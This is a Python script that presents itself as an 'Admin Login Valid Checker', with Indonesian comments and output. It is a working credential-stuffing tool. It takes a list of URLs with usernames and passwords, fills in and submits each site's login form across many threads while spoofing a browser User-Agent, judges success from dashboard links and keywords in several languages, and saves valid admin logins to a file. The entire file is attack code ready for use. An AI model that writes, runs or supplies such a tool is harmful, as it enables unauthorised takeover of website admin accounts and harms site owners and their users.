import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from urllib.parse import urljoin
from requests.exceptions import RequestException, SSLError
from langdetect import detect

# Initialize Colorama
init(autoreset=True)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner
def print_banner():
    banner = f"""
	{Fore.RED}
    =======================================================      
    .####.##.....##.....######.....###....##....##.########
    ..##..###...###....##....##...##.##...###...##......##.
    ..##..####.####....###.......##...##..####..##.....##..
    ..##..##..#..##.........###.#########.##..####...##....
    ..##..##.....##....##....##.##.....##.##...###..##.....
    .####.##.....##.....######..##.....##.##....##.########
                  #All Admin Login Valid Checker 
    =======================================================
	{Style.RESET_ALL}
    """
    print(banner)

# Generator to read large files line by line
def process_url_list(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line.count('|') == 2:  # Ensure correct format
                url, username, password = line.split('|')
                if not url.startswith(('http://', 'https://')):
                    url = f"http://{url}"
                yield url, username, password

# Save successful logins to a file
def save_to_file(file_path, data):
    with open(file_path, 'a') as file:
        file.write(data + '\n')

# Detect language of the page
def detect_language(text):
    try:
        return detect(text)
    except:
        return "en"  # Default to English if detection fails

# Get keywords based on detected language
def get_keywords_by_language(language):
    if language == "en":  # English
        success_keywords = ['Dashboard', 'Admin Dashboard', 'Success Login', 'Valid Login', 'Profile', 'success']
        failure_keywords = ['Failed', 'Invalid', 'wrong password', 'error', 'Incorrect', 'not correct', 'not active', 'not register', 'not match', 'not correct', 'failure']
    elif language == "id":  # Indonesian
        success_keywords = ['Berhasil', 'Sukses', 'Panel Admin', 'Login Valid', 'Profil']
        failure_keywords = ['Gagal', 'Tidak Valid', 'sandi salah', 'Password Salah', 'tidak benar', 'tidak aktif', 'tidak terdaftar', 'username salah', 'tidak terdaftar']
    elif language == "es":  # Spanish
        success_keywords = ['Éxito', 'Inicio Correcto', 'Perfil', 'Panel de Administración', 'Acceso exitoso']
        failure_keywords = ['Fallido', 'Inválido', 'contraseña incorrecta', 'error', 'incorrecto', 'no activo', 'no registrado']
    elif language == "pt":  # Portuguese (Brazil)
        success_keywords = ['Sucesso', 'Login Válido', 'Perfil', 'Painel de Administração']
        failure_keywords = ['Falha', 'Inválido', 'senha errada', 'erro', 'incorreto', 'não ativo', 'não registrado']
    elif language == "th":  # Thai
        success_keywords = ['สำเร็จ', 'เข้าสู่ระบบสำเร็จ', 'โปรไฟล์', 'แผงผู้ดูแลระบบ']
        failure_keywords = ['ล้มเหลว', 'ไม่ถูกต้อง', 'รหัสผ่านผิด', 'ข้อผิดพลาด', 'ไม่ถูกต้อง', 'ไม่ใช้งาน', 'ไม่ได้ลงทะเบียน']
    elif language == "vi":  # Vietnamese
        success_keywords = ['Thành công', 'Đăng nhập thành công', 'Hồ sơ', 'Bảng điều khiển quản trị']
        failure_keywords = ['Thất bại', 'Không hợp lệ', 'sai mật khẩu', 'lỗi', 'không đúng', 'không hoạt động', 'không đăng ký']
    elif language == "zh":  # Chinese
        success_keywords = ['成功', '登录成功', '个人资料', '管理面板']
        failure_keywords = ['失败', '无效', '密码错误', '错误', '不正确', '未激活', '未注册']
    else:  # Default to English
        success_keywords = ['Dashboard', 'Admin Dashboard', 'Success Login', 'Valid Login', 'Profile', 'success']
        failure_keywords = ['Failed', 'Invalid', 'wrong password', 'error', 'Incorrect', 'not correct', 'not active', 'not register']

    return success_keywords, failure_keywords

# Check if login was successful
def is_login_successful(soup, response_text, success_keywords):
    # Link internal keberhasilan
    success_links = ['/profile', '/profile.php', '/setting', '/setting.php', '/dashboard', '/logout', '/logout.php']
    for link in soup.find_all('a', href=True):
        href = link.get('href')
        if any(success_link in href for success_link in success_links):
            return True

    # Kata kunci keberhasilan
    if any(keyword.lower() in response_text.lower() for keyword in success_keywords):
        return True

    return False

# Check if login failed
def is_login_failed(response_text, failure_keywords):
    return any(keyword.lower() in response_text.lower() for keyword in failure_keywords)

# Perform login check
def login_checker(url, username, password):
    try:
        # Get the login page
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Detect language and get appropriate keywords
        detected_language = detect_language(response.text)
        success_keywords, failure_keywords = get_keywords_by_language(detected_language)

        # Parse form inputs
        form = soup.find('form')
        if not form:
            return False  # Skip URLs without forms

        action = form.get('action', '')
        login_url = urljoin(url, action)

        # Identify input fields
        data = {}
        inputs = form.find_all('input')
        for inp in inputs:
            name = inp.get('name', '').lower()
            input_type = inp.get('type', '').lower()
            if input_type in ['text', 'email', 'number'] or any(keyword in name for keyword in ['username', 'id', 'cpf', 'user', 'emailid', 'phone']):
                data[inp.get('name')] = username
            elif input_type == 'password' or any(keyword in name for keyword in ['password', 'userpass', 'passid']):
                data[inp.get('name')] = password
            elif input_type == 'hidden': 
                data[inp.get('name')] = inp.get('value', '')
            

        # Submit the form
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Referer': url
        }
        login_response = requests.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=True)
        login_soup = BeautifulSoup(login_response.text, 'html.parser')

        # Check for failure
        if is_login_failed(login_response.text, failure_keywords):
            print(f"{Fore.RED}[+] Gagal {url}|{username}|{password}{Style.RESET_ALL}")
            return False

        # Check for success
        if is_login_successful(login_soup, login_response.text, success_keywords):
            print(f"{Fore.GREEN}[+] Berhasil {url}|{username}|{password}{Style.RESET_ALL}")
            save_to_file('berhasil.txt', f"{url}|{username}|{password}")
            return True

        # If no success or failure indications found, consider as failure
        print(f"{Fore.RED}[+] Gagal {url}|{username}|{password}{Style.RESET_ALL}")
        return False

    except (SSLError, RequestException):
        return False  # Skip on errors silently

# Main function
def main():
    clear_screen()  # Clear the screen when the program starts
    print_banner()
    input_file = input(f"{Fore.YELLOW}Input list file (e.g., list.txt): {Style.RESET_ALL}").strip()
    thread_count = int(input(f"{Fore.YELLOW}Number of threads: {Style.RESET_ALL}").strip())

    try:
        print(f"\n{Fore.CYAN}Memulai pengecekan URL dengan {thread_count} threads...{Style.RESET_ALL}\n")

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {
                executor.submit(login_checker, url, username, password): (url, username, password)
                for url, username, password in process_url_list(input_file)
            }

            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass  # Skip any exceptions silently

    except FileNotFoundError:
        print(f"{Fore.RED}File tidak ditemukan: {input_file}{Style.RESET_ALL}")
    except Exception as e:
        pass  # Skip unexpected exceptions silently

if __name__ == "__main__":
    main()
